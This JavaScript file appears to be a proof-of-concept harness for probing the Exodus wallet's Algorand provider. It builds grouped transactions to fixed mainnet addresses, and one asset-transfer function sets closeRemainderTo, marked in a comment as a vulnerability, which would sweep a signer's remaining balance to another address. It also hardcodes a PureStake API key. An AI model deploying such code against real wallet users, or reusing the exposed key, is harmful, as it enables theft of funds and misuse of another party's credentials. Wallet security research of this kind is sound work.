///////////////////////////////////////////////////////////////////////////////////
/////////////////////// ALGO //////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////
            function algo_connect() {
                console.log("[*] CONNECT")
                window.exodus.algorand.connect();
            }



//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//

            // function used to wait for a tx confirmation
            const waitForConfirmation = async function (algodclient, txId) {
                let response = await algodclient.status().do();
                let lastround = response["last-round"];
                console.log(`Waiting for transaction confirmation for txn ${txId}`);
                while (true) {
                    const pendingInfo = await algodclient.pendingTransactionInformation(txId).do();
                    if (pendingInfo["confirmed-round"] !== null && pendingInfo["confirmed-round"] > 0) {
                        //Got the completed Transaction
                        console.log("Transaction " + txId + " confirmed in round " + pendingInfo["confirmed-round"]);
                        break;
                    }
                    lastround++;
                    await algodclient.statusAfterBlock(lastround).do();
                }
                console.log('Transaction confirmed');
            }


            async function sign_then_submit_double_transactions() {

                try {
                    const receiver = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
                    const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                    const port = "";
                    const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                    
                    const algodClient = new algosdk.Algodv2(token, baseServer, port);

                    let sender = window.exodus.algorand.address;
                    console.log('[*] sender: ')
                    console.log(sender)

                    let suggestedParams = await algodClient.getTransactionParams().do();
                
                    let amount = 100000; // equals 0.1 ALGO
                    let amount2 = 200000; // equals 0.2 ALGO

                    const enc = new TextEncoder();
                    let myNote = "doubleassetnote80";
                    let myNote2 = myNote + '-2';
                    const note = enc.encode(myNote);
                    const note2 = enc.encode(myNote2);

                    let txn1 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                        suggestedParams,
                        from: sender,
                        to: receiver,
                        amount: amount,
                        note: note
                    });

                    let txn2 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                        suggestedParams,
                        from: sender,
                        to: receiver,
                        amount: amount2,
                        note: note2
                    });

                    algosdk.assignGroupID([txn1,txn2]);

                    const signedTransactions = await window.exodus.algorand.signTransaction([
                        txn1.toByte(),
                        txn2.toByte(),
                    ])

                    let groupedSignedTxns = signedTransactions;

                    let tx = (await algodClient.sendRawTransaction(groupedSignedTxns).do());
                    console.log("[*] Transaction : " + tx.txId);

                    await waitForConfirmation(algodClient, tx.txId);

                } catch (err) {
                    console.log("[-] ERR: ", err);
                }
            }

//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//


//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//


            async function sign_then_submit_double_asset_transactions() {

                try {
                    const receiver = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
                    const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                    const port = "";
                    const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                    
                    const algodClient = new algosdk.Algodv2(token, baseServer, port);

                    let sender = window.exodus.algorand.address;
                    console.log('[*] sender: ')
                    console.log(sender)

                    let suggestedParams = await algodClient.getTransactionParams().do();
                
                    let amount = 100000; // equals 0.1 ALGO

                    const enc = new TextEncoder();
                    let myNote = "doubleassetnote8";
                    let myNote2 = myNote + '-2';
                    const note = enc.encode(myNote);
                    const note2 = enc.encode(myNote2);

                    let txn1 = algosdk.makeAssetTransferTxnWithSuggestedParams(
                        sender,
                        receiver, 
                        undefined, 
                        undefined,
                        amount,  
                        note, 
                        13300122, 
                        suggestedParams
                    )

                    let txn2 = algosdk.makeAssetTransferTxnWithSuggestedParams(
                        sender,
                        receiver, 
                        undefined, 
                        undefined,
                        amount,  
                        note2, 
                        13300122, 
                        suggestedParams
                    )

                    algosdk.assignGroupID([txn1,txn2]);

                    const signedTransactions = await window.exodus.algorand.signTransaction([
                        txn1.toByte(),
                        txn2.toByte(),
                    ])

                    let groupedSignedTxns = signedTransactions;

                    let tx = (await algodClient.sendRawTransaction(groupedSignedTxns).do());
                    console.log("[*] Transaction : " + tx.txId);

                    await waitForConfirmation(algodClient, tx.txId);

                } catch (err) {
                    console.log("[-] ERR: ", err);
                }
            }

//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
            
            
            async function algo_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);
        
                let sender = window.exodus.algorand.address;
                console.log('[*] sender: ')
                console.log(sender)

                //Check your balance
                let accountInfo = await algodClient.accountInformation(sender).do();
                console.log('[*] accountInfo: ')
                console.log(accountInfo)
                console.log("Account balance: %d microAlgos", accountInfo.amount);
                
                // Construct the transaction
                let suggestedParams = await algodClient.getTransactionParams().do();
                
                const receiver = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";
                
                let amount = 100000; // equals 0.1 ALGO
                

                const enc = new TextEncoder();
                const note = enc.encode("note84");

                //let closeRemainderTo = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";

                let txn1 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount,
                    note: note
                });

                console.log("[*] txn1: ");
                console.log(txn1);

                algosdk.assignGroupID([txn1])

                try {
                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});
                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn1.toByte(),
                    ]);
                    console.log({tmp});
                    const { signedTransactions } = tmp;

                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                } catch (e) {
                    console.log('[-] algo_transaction ERROR: ');
                    console.log(e);
                }
            }


            // closeRemainerTo vuln
            async function algo_double_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);
        
                let sender = window.exodus.algorand.address;
                console.log('[*] sender: ')
                console.log(sender)

                //Check your balance
                let accountInfo = await algodClient.accountInformation(sender).do();
                console.log('[*] accountInfo: ')
                console.log(accountInfo)
                console.log("Account balance: %d microAlgos", accountInfo.amount);
                
                // Construct the transaction
                let suggestedParams = await algodClient.getTransactionParams().do();
                
                const receiver = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";
                
                let amount = 400000; // equals 0.4 ALGO
                let amount2 = 100000; // equals 0.1 ALGO
                

                const enc = new TextEncoder();
                let myNote = "doublenote84";
                let myNote2 = myNote + '-2';
                const note = enc.encode(myNote);
                const note2 = enc.encode(myNote2);

                //let closeRemainderTo = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";

                let txn1 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount,
                    note: note
                });

                console.log("[*] txn1: ");
                console.log(txn1);

                let txn2 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount2,
                    note: note2
                });

                console.log("[*] txn2: ");
                console.log(txn2);

                const result = await window.exodus.algorand.connect();
                console.log({result});

                algosdk.assignGroupID([txn1,txn2])

                try {
                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});
                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn1.toByte(),
                        txn2.toByte(),
                    ]);
                    console.log({tmp});
                    const { signedTransactions } = tmp;

                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                } catch (e) {
                    console.log('[-] algo_transaction ERROR: ');
                    console.log(e);
                }
            }


            async function asset_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);

                

                (async () => {

                    let assetID = 312769;
                    let params = await algodClient.getTransactionParams().do();
                    let sender = window.exodus.algorand.address;
                    let recipient = '3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA';
                    let revocationTarget = undefined;
                    let closeRemainderTo = undefined;
                    const enc = new TextEncoder();
                    let myNote = "assetnote90";
                    let note = enc.encode(myNote);;
                    let amount = 1;
                    let txn = algosdk.makeAssetTransferTxnWithSuggestedParams(sender, recipient, closeRemainderTo, revocationTarget,
                        amount,  note, assetID, params);
                    
                    algosdk.assignGroupID([txn]);

                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});

                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn.toByte(),
                    ]);
                    const { signedTransactions } = tmp;
                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                })().catch(e => {
                    console.log('[-] ERROR: ');
                    console.log(e);
                });
            }


            async function asset_transaction_closeRemainderTo() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);

                

                (async () => {

                    let assetID = 312769;
                    let params = await algodClient.getTransactionParams().do();
                    let sender = window.exodus.algorand.address;
                    let recipient = '3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA';
                    let revocationTarget = undefined;
                    let closeRemainderTo = '3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA';
                    const enc = new TextEncoder();
                    let myNote = "assetRemaindernote90";
                    let note = enc.encode(myNote);;
                    let amount = 1;
                    let txn = algosdk.makeAssetTransferTxnWithSuggestedParams(sender, recipient, closeRemainderTo, revocationTarget,
                        amount,  note, assetID, params);
                    
                    algosdk.assignGroupID([txn]);

                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});

                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn.toByte(),
                    ]);
                    const { signedTransactions } = tmp;
                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                })().catch(e => {
                    console.log('[-] ERROR: ');
                    console.log(e);
                });
            }
